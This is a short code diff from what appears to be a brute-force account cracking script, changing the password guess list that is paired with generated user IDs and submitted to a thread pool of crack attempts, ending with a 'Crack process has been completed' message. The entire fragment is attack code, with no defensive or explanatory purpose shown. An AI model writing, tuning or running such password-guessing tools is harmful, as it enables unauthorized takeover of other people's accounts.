@@ -439,7 +439,7 @@ def C3():
         print(50*'_')
         for guru in user:
             uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','@@@@@','najmul123','najmul1234','najmul@@']
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','@@@@@','tamanna','sadiya','jannat']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
     print(' [\033[1;92m\033[1;34m✔\033[1;92m] Crack process has been completed')
